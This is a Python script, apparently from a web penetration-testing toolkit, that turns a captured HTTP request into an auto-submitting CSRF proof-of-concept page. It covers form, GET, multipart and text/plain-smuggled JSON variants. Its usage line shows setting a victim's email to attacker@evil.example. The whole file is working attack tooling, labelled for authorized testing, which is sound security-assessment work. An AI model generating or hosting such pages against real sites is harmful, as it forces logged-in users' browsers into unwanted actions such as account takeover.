#!/usr/bin/env python3
"""
csrf_poc_generator.py — turn a captured HTTP request into a CSRF PoC HTML page (guide §23).
Reads a raw request (Burp "Copy to file" format), emits a self-contained auto-submit page.

AUTHORIZED TESTING ONLY. Validate the PoC in a REAL default-settings browser, cross-site — that is
the only valid CSRF test (guide §19). Check the session cookie's SameSite FIRST (guide §4).

Usage:
  python3 csrf_poc_generator.py --request req.txt --type auto --out poc.html
  python3 csrf_poc_generator.py --request req.txt --type json --set email=attacker@evil.example
  python3 csrf_poc_generator.py --request req.txt --type get      # for SameSite=Lax GET sinks

Request file format (raw HTTP):
  POST /account/email HTTP/1.1
  Host: target.com
  Content-Type: application/x-www-form-urlencoded

  email=old@user.com&name=Bob
"""
import argparse
import html
import sys
import urllib.parse


def parse_request(text: str):
    # split headers / body on the first blank line
    if "\r\n\r\n" in text:
        head, body = text.split("\r\n\r\n", 1)
    elif "\n\n" in text:
        head, body = text.split("\n\n", 1)
    else:
        head, body = text, ""
    lines = head.replace("\r\n", "\n").split("\n")
    method, path, *_ = lines[0].split(" ")
    headers = {}
    for ln in lines[1:]:
        if ":" in ln:
            k, v = ln.split(":", 1)
            headers[k.strip().lower()] = v.strip()
    host = headers.get("host", "TARGET-HOST")
    scheme = "https"
    ctype = headers.get("content-type", "")
    return method.upper(), scheme, host, path, ctype, body.strip()


def apply_sets(params: dict, sets):
    for s in (sets or []):
        if "=" in s:
            k, v = s.split("=", 1)
            params[k] = v
    return params


def parse_urlencoded(body):
    out = {}
    for pair in body.split("&"):
        if not pair:
            continue
        if "=" in pair:
            k, v = pair.split("=", 1)
            out[urllib.parse.unquote_plus(k)] = urllib.parse.unquote_plus(v)
        else:
            out[urllib.parse.unquote_plus(pair)] = ""
    return out


def page(inner, note):
    return (f"<!doctype html>\n<html><head><meta charset=utf-8>\n"
            f"<!-- CSRF PoC (authorized testing). {note} -->\n"
            f"<!-- Host CROSS-SITE; open as the logged-in victim in a DEFAULT browser (guide §19/§23). -->\n"
            f"</head><body>\n<h3>loading…</h3>\n{inner}\n</body></html>\n")


def gen_form(action, params, enctype=None):
    fields = "\n".join(
        f'  <input type="hidden" name="{html.escape(k, quote=True)}" value="{html.escape(str(v), quote=True)}">'
        for k, v in params.items())
    enc = f' enctype="{enctype}"' if enctype else ""
    form = (f'<form id="csrf" action="{html.escape(action, quote=True)}" method="POST"{enc}>\n'
            f'{fields}\n</form>\n<script>document.getElementById("csrf").submit();</script>')
    return form


def gen_get(action, params):
    import json
    q = urllib.parse.urlencode(params)
    url = f"{action}?{q}" if q else action
    # JS-string context: JSON-encode the URL. Do NOT html.escape here — inside <script> the HTML parser does
    # NOT decode entities, so html.escape would turn '&' into a literal '&amp;' and corrupt multi-param URLs
    # (email=..&role=admin -> email=..&amp;role=admin). The <a href> below IS attribute context, so it keeps html.escape.
    js_url = json.dumps(url).replace("</", "<\\/")   # json.dumps quotes/escapes safely; neutralize any stray </script>
    return (f'<script>window.location={js_url};</script>\n'
            f'<noscript><a href="{html.escape(url, quote=True)}">continue</a></noscript>')


def gen_json_textplain(action, body, params):
    # Build a JSON body, then encode it as a single text/plain form field split across name/value.
    import json
    try:
        obj = json.loads(body) if body.strip().startswith("{") else {}
    except Exception:
        obj = {}
    # merge --set overrides (and any parsed params) ON TOP of the original body
    obj.update(params)
    js = json.dumps(obj, separators=(",", ":"))
    # split so the urlencoded "name=value" reconstructs valid JSON: name = '{"a":"b","junk":"' value = '"}'
    if js.endswith("}"):
        left = js[:-1] + ',"csrfpad":"'   # inject a padding key
        right = '"}'
    else:
        left, right = js, ""
    name = html.escape(left, quote=True)
    value = html.escape(right, quote=True)
    return (f'<form id="csrf" action="{html.escape(action, quote=True)}" method="POST" enctype="text/plain">\n'
            f'  <input name=\'{name}\' value=\'{value}\'>\n'
            f'</form>\n<script>document.getElementById("csrf").submit();</script>\n'
            f'<!-- text/plain JSON trick: works only if the server parses text/plain bodies as JSON (guide §8). -->')


def main():
    ap = argparse.ArgumentParser(description="Generate a CSRF PoC HTML page from a raw request.")
    ap.add_argument("--request", required=True, help="path to a raw HTTP request file")
    ap.add_argument("--type", default="auto", choices=["auto", "form", "get", "json", "multipart"])
    ap.add_argument("--set", action="append", default=[], help="override/insert a param: key=value (repeatable)")
    ap.add_argument("--out", default="poc.html")
    args = ap.parse_args()

    with open(args.request, "r", encoding="utf-8", errors="replace") as f:
        method, scheme, host, path, ctype, body = parse_request(f.read())

    # path may already include a query
    base_path = path.split("?", 1)[0]
    query = path.split("?", 1)[1] if "?" in path else ""
    action = f"{scheme}://{host}{base_path}"

    # gather params from body (urlencoded) or query
    if "json" in ctype or body.strip().startswith("{"):
        params = apply_sets({}, args.set)
        is_json = True
    else:
        src = body if body else query
        params = apply_sets(parse_urlencoded(src), args.set)
        is_json = False

    t = args.type
    if t == "auto":
        if is_json:
            t = "json"
        elif method == "GET":
            t = "get"
        elif "multipart" in ctype:
            t = "multipart"
        else:
            t = "form"

    if t == "form":
        inner = gen_form(action, params)
        note = "POST form — needs session cookie SameSite=None to fire cross-site."
    elif t == "get":
        inner = gen_get(action, params)
        note = "GET navigation — works under default SameSite=Lax (top-level nav). Only for GET state-changes."
    elif t == "multipart":
        inner = gen_form(action, params, enctype="multipart/form-data")
        note = "multipart form — needs SameSite=None."
    elif t == "json":
        inner = gen_json_textplain(action, body, params)
        note = "JSON via text/plain — needs SameSite=None AND a server that parses text/plain as JSON."
    else:
        print("unknown type", file=sys.stderr); sys.exit(2)

    out = page(inner, note)
    with open(args.out, "w", encoding="utf-8") as f:
        f.write(out)

    print(f"[+] wrote {args.out}  (type={t}, action={action})")
    print(f"[i] {note}")
    print("[i] Host it CROSS-SITE and open as the logged-in victim in a DEFAULT browser (guide §19).")
    print("[i] Reminder: read the session cookie's SameSite first (guide §4). Lax/Strict may make this N/A.")


if __name__ == "__main__":
    main()
